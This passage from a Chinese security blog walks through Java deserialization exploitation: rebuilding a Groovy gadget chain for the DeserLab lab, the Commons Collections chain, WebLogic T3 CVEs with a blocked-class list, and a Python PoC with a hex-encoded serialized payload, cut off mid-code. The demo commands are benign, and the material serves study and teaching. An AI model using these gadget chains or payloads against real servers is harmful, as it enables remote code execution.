<p>如果一切顺利，你将看到以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo tcpdump -i lo icmp</div><div class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</div><div class="line">listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes</div><div class="line">22:58:06.215178 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> request, id 31636, seq 1, length 64</div><div class="line">22:58:06.215187 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> reply, id 31636, seq 1, length 64</div><div class="line">22:58:07.215374 IP localhost &gt; localhost: ICMP <span class="built_in">echo</span> request, id 31636, seq 2, length 64</div></pre></td></tr></table></figure></p>
<p>我们已经成功地利用了DeserLab。接下来两个部分，我们希望能更好地了解我们发送到DeserLab的payload。</p>
<p>###手动创建payload<br>了解我们的payload的最好的方法是自己重建完全相同的payload，是的，这意味着写java代码。但问题是我们从哪里开始？我们可以像我们在看pcap时一样看看序列化payload。下面的代码将payload转换为十六进制字符串，我们可以使用SerializationDumper或者jdeserialize分析文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'payload.bin'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>().encode(<span class="string">'hex</span></div></pre></td></tr></table></figure></p>
<p>所以让我们来详细了解一下，在具体情况下，如何运作。当然，在找出这一切后，你发现了一个已经描述它的页面，所以你可以跳过这个部分，阅读<a href="https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical" target="_blank" rel="external">这个</a>。本节的其余部分将着重于我的方法。我的方法的重要支柱之一也在阅读这个漏洞的ysoserial实现的根源。我不会不断提到，但如果你想知道我是如何计算出流量的，那是由于读取ysoserial实现的。<br>通过这些工具放置有效载荷后，在这两种情况下，都会产生很多Java类的很长的输出。要注意的主要类名是输出“sun.reflect.annotation.AnnotationInvocationHandler”的第一个。这个类可能看起来很熟悉，因为它似乎是大量反序列化漏洞的入门点。引起我注意的其他事情是“java.lang.reflect.Proxy”，“org.codehaus.groovy.runtime.ConvertedClosure”和“org.codehaus.groovy.runtime.MethodClosure”。他们引起了我注意的原因是因为他们引用了我们用于开发的库，以及从线上文章中已知的类来解释Java反序列化漏洞并与我在ysoserial源中看到的类匹配。<br>有一个重要的概念，你需要注意，事实上，当你执行反序列化攻击时，你发送一个对象的“保存”状态说话。这意味着你完全依赖于接收方的行为，更具体地说，你依赖于“保存”状态反序列化时所采取的操作。这意味着如果对方不调用发送对象的任何方法，则不会执行远程代码。这意味着你唯一的影响是设置你发送的对象的属性。现在这个概念很清楚，这意味着我们发送的第一个类应该有一个自动调用的方法，如果我们要实现代码执行，这解释了为什么第一类是如此特别。如果我们看看AnnotationInvocationHandler的代码，我们可以看到构造函数接受一个java.util.map对象，并且方法readObject调用Map对象上的一个方法。像你可能从阅读其他文章可以知道，当流被反序列化时，readObject被自动调用。我们开始构建我们自己的漏洞利用，基于这些信息，并从多个其他文章（在本文末尾引用的代码中）借鉴代码，我们创建以下内容。如果你想了解代码读取反思。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//this is the first class that will be deserialized</div><div class="line">String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line">//access the constructor of the AnnotationInvocationHandler class</div><div class="line">final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];</div><div class="line">//normally the constructor is not accessible, so we need to make it accessible</div><div class="line">constructor.setAccessible(<span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
<p>这通常是我有时花了几个小时调试和阅读我不知道的所有事情的部分，因为如果你尝试编译这个很好，你会学到很多.所以这里是你可以编译的代码段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//regular imports</div><div class="line">import java.io.IOException;</div><div class="line"></div><div class="line">//reflection imports</div><div class="line">import java.lang.reflect.Constructor;</div><div class="line"></div><div class="line">public class ManualPayloadGenerateBlog&#123;</div><div class="line"> public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</div><div class="line"> //this is the first class that will be deserialized</div><div class="line"> String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line"> //access the constructor of the AnnotationInvocationHandler class</div><div class="line"> final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];</div><div class="line"> //normally the constructor is not accessible, so we need to make it accessible</div><div class="line"> constructor.setAccessible(<span class="literal">true</span>);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>你可以使用以下命令来编译和运行代码，即使它不会执行任何操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac ManualPayloadGenerateBlog</div><div class="line">java ManualPayloadGenerateBlog</div></pre></td></tr></table></figure></p>
<p>当你扩展此代码时，请记住以下内容：<br>google打印的错误代码<br>类名应等于文件名<br>知道有java 帮助<br>上述代码使初始入口点类可用，构造函数可访问，但是我们需要为构造函数提供哪些参数？大多数例子有以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">constructor.newInstance(Override.class, map);</div></pre></td></tr></table></figure></p>
<p>我理解的’map’参数，就是在初始readObject调用期间调用’entrySet’方法的对象。我不明白第一个参数的内部工作原理，主要的一点是在readObject方法内部进行检查，以确保第一个参数的类型为“AnnotationType”。我们通过提供“AnnotationType”类型的buildin’Override’类来实现这一点。<br>现在我们来到有趣的部分，从’好的有道理’到’这是如何工作的’。要理解，重要的是要意识到第二个参数是一个Java代理对象，而不是一个简单的Java映射对象。这是什么意思？<a href="http://www.baeldung.com/java-dynamic-proxies" target="_blank" rel="external">这篇文章</a>很好的解释了Java动态代理，并提供了很好的代码示例，这是文章的引用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dynamic proxies allow one single class with one single method to service multiple method calls to arbitrary classes with an arbitrary number of methods. A dynamic proxy can be thought of as a kind of Facade, but one that can pretend to be an implementation of any interface. Under the cover, it routes all method invocations to a single handler – the invoke() method.</div></pre></td></tr></table></figure></p>
<p>我理解的是，它是一个 Java map 对象，然后将所有调用原始的Map对象方法路由到另一个类的单一方法。让我们看看我们现在所了解的：<br><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/flow.png" alt=""><br>这意味着我们可以尝试用这样一个Map对象来扩展我们的源代码，例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] &#123;Map.class&#125;, &lt;unknown-invocationhandler&gt;);</div></pre></td></tr></table></figure></p>
<p>注意我们仍然需要适应的 invocationhandler，但我们没有。这是Groovy最终要适应的部分，因为直到现在我们仍然在常规Java类的领域。Groovy适合的原因是因为它有一个InvocationHandler。所以当InvocationHandler被调用时，最终会导致代码执行如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(<span class="string">"ping 127.0.0.1"</span>, <span class="string">"execute"</span>), <span class="string">"entrySet"</span>);</div><div class="line">final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] &#123;Map.class&#125;, closure);</div></pre></td></tr></table></figure></p>
<p>就像你可以在上面的代码中看到的，我们现在终于有了invocationhandler，它就是ConvertedClosure对象。你可以通过反编译Groovy库来确认这一点，当你看到ConvertedClosure类时，你会看到它扩展了ConversionHandler类，如果你反编译该类你将看到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public abstract class ConversionHandler</div><div class="line">implements InvocationHandler, Serializable</div></pre></td></tr></table></figure></p>
<p> 实现InvocationHandler的事实解释了为什么我们可以在Proxy对象中使用它。然而，我不明白的一件事是，Groovy payload<br> 是从Map代理调用到实际代码执行的。您可以使用反编译器来查看Groovy库，但是通常我发现可以使用谷歌查询补充代码阅读来了解它。一个挑战<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groovy execute shell <span class="built_in">command</span></div></pre></td></tr></table></figure></p>
<p> 上面的查询可能会让你在各种各样的页面上找到答案。这实质上告诉我们，显然String对象有一个额外的方法是“execute”。我经常使用上述查询来处理我不熟悉的环境，因为执行shell命令通常是开发人员需要的，通常可以在互联网上找到答案。这有助于我完整地了解这个payload的工作原理，现在可以看出如下关系：<br> <img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/flow.png" alt=""><br> 完整的代码在<a href="https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7" target="_blank" rel="external">这里</a>。编译，执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac -cp DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate.java</div><div class="line">java -cp .:DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate &gt; payload_manual.bin</div></pre></td></tr></table></figure></p>
<p>当我们使用python exploit开发它时，它应该具有与ysoserial payload完全相同的结果。令我吃惊的是，payload甚至有相同的哈希：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sha256sum payload_ping_localhost.bin payload_manual.bin</div><div class="line">4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_ping_localhost.bin</div><div class="line">4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_manual.bin</div></pre></td></tr></table></figure></p>
<p>感谢您抽出时间阅读本文，更重要的是，我希望它可以帮助您利用Java反序列化漏洞以及更好地了解它们。<br>参考链接：<br><a href="https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical" target="_blank" rel="external">https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical</a><br><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</a><br><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_blank" rel="external">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a><br><a href="http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html" target="_blank" rel="external">http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html</a><br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="external">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a><br><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478" target="_blank" rel="external">https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</a><br><a href="https://www.youtube.com/watch?v=VviY3O-euVQ" target="_blank" rel="external">https://www.youtube.com/watch?v=VviY3O-euVQ</a><br><a href="http://wouter.coekaerts.be/2015/annotationinvocationhandler" target="_blank" rel="external">http://wouter.coekaerts.be/2015/annotationinvocationhandler</a><br><a href="http://www.baeldung.com/java-dynamic-proxies" target="_blank" rel="external">http://www.baeldung.com/java-dynamic-proxies</a><br><a href="https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy" target="_blank" rel="external">https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy</a><br><a href="https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful" target="_blank" rel="external">https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/09/12/Java反序列化漏洞利用的学习与实践/" data-id="cjca1zrwi000f881bhn04ua8y" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Java反序列化漏洞" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/10/Java反序列化漏洞/" class="article-date">
  <time datetime="2017-09-10T03:46:54.000Z" itemprop="datePublished">2017-09-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/10/Java反序列化漏洞/">序列化和反序列化</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://xianzhi.aliyun.com/forum/topic/1825/" target="_blank" rel="external">先知首发地址</a></p>
<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>序列化：把对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为对象的过程。<br><img src="/upload_image/7.png" alt=""></p>
<h5 id="JDK类库中的序列化API"><a href="#JDK类库中的序列化API" class="headerlink" title="JDK类库中的序列化API"></a>JDK类库中的序列化API</h5><p>java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。<br>　　java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。<br><img src="/upload_image/8.png" alt=""><br><strong>在Java中，对象的序列化与反序列化被广泛应用到RMI(远程方法调用)及网络传输中。</strong></p>
<h5 id="Java序列化数据解析"><a href="#Java序列化数据解析" class="headerlink" title="Java序列化数据解析"></a>Java序列化数据解析</h5><p>数据开头为“AC ED 00 05”，数据内容包含了包名与类名、类中包含的变量名称、类型及变量的值。<br><img src="/upload_image/9.png" alt=""><br>ava.io.ObjectStreamConstants类中定义了STREAM_MAGIC与STREAM_VERSION，查看JDK1.5、1.6、1.7、1.8的ObjectStreamConstants类，STREAM_MAGIC值均为0xaced，STREAM_VERSION值均为5。</p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>Breenmachine的这篇blog让java反序列化漏洞得到更多的关注，他介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br><img src="/upload_image/10.png" alt=""></p>
<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>如果Java应用对用户输入，即不可信数据没有进行校验而直接做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p>
<h3 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h3><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。<br>该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法，并且该方法在相关对象反序列化时并未进行任何校验.<br>Apache Commons Collections中提供了一个Transformer的类，这个接口的的功能就是把一个对象转换为另一个对象。<br><img src="/upload_image/11.png" alt=""><br>图上红框标注的是java反序列化漏洞的poc包含的类。<br>invokeTransformer：Transformer implementation that creates a new object instance by reflection.（通过反射，返回一个对象）<br>ChainedTransformer：Transformer implementation that chains the specified transformers together.（把transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）<br>ConstantTransformer：Transformer implementation that returns the same constant each time.（把一个对象转化为常量，并返回）<br>InvokerTransformer是比较关键的一个类，我们来看看它的实现：<br><img src="/upload_image/18.png" alt=""><br>我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象(反射机制就是可以把一个类,类的成员(函数,属性),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数<br>POC：<br><img src="/upload_image/17.png" alt=""><br>Poc解读：整个poc的逻辑可以这么理解，构建innerMap的键值对，为其赋值，利用Transformed的decorate方法，可以对Map数据结构的key，value进行transform。该方法有三个参数，第一个为待转化的map对象，第二个为map对象内的key要经过的转化方法，第三个参数为map对象内的value要经过的转化方法。<br>TransformedMap.decoreate(目标map，key的转化对象（null或者单个链），value的转化对象)<br>poc对innerMap的value进行转换，当innerMap的value执行完一个完整的转换链，就完成了命令执行。</p>
<p>如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？<br>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。<br>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。<br>我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型.<br><img src="/upload_image/16.png" alt=""><br>AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数。<br><img src="/upload_image/20.png" alt=""><br>因此，我们只需要使用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。<br>这段POC本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime)Runtime.class.getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null)).<span class="built_in">exec</span>(<span class="string">"calc.exe"</span>);</div></pre></td></tr></table></figure></p>
<h3 id="Weblogic-Exploit"><a href="#Weblogic-Exploit" class="headerlink" title="Weblogic Exploit"></a>Weblogic Exploit</h3><p>Oracle Weblogic <strong>T3</strong> Deserialization Remote Code Execution Vulnerability<br>CVE-2015-4852<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2017-3248<br>weblogic 采用T3协议进行序列化数据的传输，可以看到weblogic发送的JAVA序列化数据分为6个部分，第一部分的前四个字节为整个数据包的长度，第2-6部分均为JAVA序列化数据。经测试，必须先发送T3协议头数据包，再发送JAVA序列化数据包，才能使weblogic进行JAVA反序列化，进而触发漏洞。如果只发送JAVA序列化数据包，不先发送T3协议头数据包，无法触发漏洞。<br><img src="/upload_image/15.png" alt=""></p>
<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>blacklist<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections.functors*</div><div class="line">com.sun.org.apache.xalan.internal.xsltc.trax*</div><div class="line">javassist*</div><div class="line">org.codehaus.groovy.runtime.ConvertedClosure</div><div class="line">org.codehaus.groovy.runtime.ConversionHandler</div><div class="line">org.codehaus.groovy.runtime.MethodClosure</div></pre></td></tr></table></figure></p>
<p>CVE-2015-4852的反序列化的点有三个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</div><div class="line">weblogic.rjvm.MsgAbbrevInputStream.class</div><div class="line">weblogic.iiop.Utils.class</div></pre></td></tr></table></figure></p>
<p>后面的几个漏洞实质都是对黑名单的一个绕过。</p>
<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>原理将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</p>
<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p>利用了黑名单之外的反序列化类，通过 JRMP 协议达到执行任意反序列化 payload。（Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。）<br>下面给出一段在tenable找的描述<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">In the <span class="keyword">case</span> of WebLogic, we are interested <span class="keyword">in</span> yososerial<span class="string">'s JRMPListener.java payload. This serializes a RemoteObjectInvocationHandler which uses a UnicastRef object to establish a TCP connection to a remote server in order to get at the remote server'</span>s RMI registry. This connection uses JRMP so the client will deserialize whatever the server responds with, achieving unauthenticated remote code execution.</div><div class="line">Exploiting WebLogic</div><div class="line">To demonstrate the issue to ZDI and Oracle, Tenable created two scripts. The first script is a server that listens <span class="keyword">for</span> the callback, called jrmp_listener.py. When the connect back connects to jrmp_listener.py it will send a CommonCollections3 payload <span class="keyword">in</span> response <span class="built_in">which</span> will trigger the RCE on WebLogic. The second script sends the serialized object to WebLogic via t3 on TCP port 7001 (just like the original FoxGlove attack), called jrmp_connect_back.py. In order to exploit WebLogic, jrmp_listener.py must be executed before jrmp_connect_back.py. The result of the exploitation will cause the connect back, <span class="built_in">which</span> exists on its own thread, to be executed multiple <span class="built_in">times</span> (<span class="built_in">which</span> means an attacker could deliver multiple payloads).</div></pre></td></tr></table></figure></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用的步骤：<br>1.找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。<br>2.应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库也行）<br>3.使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可。<br>4.通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中ObjectInputStream的反序列化操作，随后通过反射调用Runtime.getRunTime.exec即可完成利用。<br>最关键的是用恶意的序列化数据去替换正常的序列化数据</p>
<h5 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h5><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a><br><img src="/upload_image/16.png" alt=""><br>下面给出一个’CVE-2016-0638’,’CVE-2016-3510’,’CVE-2017-3248’的无害poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import socket</div><div class="line">import time</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#  @author iswin@threathunter.org</span></div><div class="line"><span class="comment">#  reffer: nessus</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</div><div class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span 